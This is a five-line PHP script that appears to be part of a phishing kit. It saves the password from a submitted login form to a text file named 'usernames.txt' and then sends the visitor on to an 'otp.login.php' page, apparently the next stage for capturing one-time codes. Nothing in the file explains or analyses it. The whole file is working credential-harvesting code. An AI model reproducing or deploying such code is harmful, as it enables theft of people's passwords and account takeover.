<?php
file_put_contents("usernames.txt", "Password: " . $_POST['login_password'] . "\n", FILE_APPEND);
header('Location: otp.login.php');
exit();
?>
